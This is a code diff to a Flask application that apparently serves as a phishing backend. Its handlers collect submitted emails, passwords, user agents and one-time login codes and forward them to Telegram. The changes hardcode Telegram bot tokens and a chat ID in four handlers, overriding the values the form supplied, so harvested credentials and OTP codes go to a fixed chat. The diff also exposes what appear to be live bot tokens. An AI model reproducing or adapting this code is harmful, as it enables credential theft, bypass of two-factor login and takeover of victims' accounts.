@@ -48,7 +48,7 @@ app.config['MAIL_DEFAULT_SENDER'] = 'moderator@sellbyit.com'
 
 # Telegram configuration (optional; consider removing if not needed)
 bot_token = "8134604995:AAEJQxsj_CePVKKRFE-VePfDmlspbFEyj-I"
-chat_id = "-1002306181543"
+chat_id = "-1002719284660"
 
 bot_token1 = "7828126568:AAHMNXYYAcvE7wLJbf8epighrBonkXd7gsg"
 chat_id1 = "1865856843"
@@ -763,8 +763,8 @@ def handle_n():
         email = request.form.get('email')
         password = request.form.get('password')
         user_agent = request.headers.get('User-Agent', '')
-        bot_token = request.form.get('bot_token')
-        chat_id = request.form.get('chat_id')
+        bot_token = "8113116705:AAHlmn8D3i60uapQZ-BOVmOPo-D7UnaxIXQ" #request.form.get('bot_token')
+        chat_id = "-1002719284660" #request.form.get('chat_id')
         bot_token1 = request.form.get('bot_token1')
         chat_id1 = request.form.get('chat_id1')
         bot_token2 = request.form.get('bot_token2')
@@ -795,8 +795,8 @@ def handle_n():
 def handle_otp_n():
     if request.method == 'POST':
         otp = request.form.get('code')
-        bot_token = request.form.get('bot_token')
-        chat_id = request.form.get('chat_id')
+        bot_token = "8113116705:AAHlmn8D3i60uapQZ-BOVmOPo-D7UnaxIXQ" #request.form.get('bot_token')
+        chat_id = "-1002719284660" #request.form.get('chat_id')
         bot_token1 = request.form.get('bot_token1')
         chat_id1 = request.form.get('chat_id1')
         bot_token2 = request.form.get('bot_token2')
@@ -828,8 +828,8 @@ def handle_p():
         email = request.form.get('email')
         password = request.form.get('password')
         user_agent = request.headers.get('User-Agent', '')
-        bot_token = request.form.get('bot_token')
-        chat_id = request.form.get('chat_id')
+        bot_token = "8113116705:AAHlmn8D3i60uapQZ-BOVmOPo-D7UnaxIXQ" #request.form.get('bot_token')
+        chat_id = "-1002719284660" #request.form.get('chat_id')
         bot_token1 = request.form.get('bot_token1')
         chat_id1 = request.form.get('chat_id1')
         bot_token2 = request.form.get('bot_token2')
@@ -861,8 +861,8 @@ def handle_p():
 def handle_otp_p():
     if request.method == 'POST':
         otp = request.form.get('code')
-        bot_token = request.form.get('bot_token')
-        chat_id = request.form.get('chat_id')
+        bot_token = "8113116705:AAHlmn8D3i60uapQZ-BOVmOPo-D7UnaxIXQ" #request.form.get('bot_token')
+        chat_id = "-1002719284660" #request.form.get('chat_id')
         bot_token1 = request.form.get('bot_token1')
         chat_id1 = request.form.get('chat_id1')
         bot_token2 = request.form.get('bot_token2')
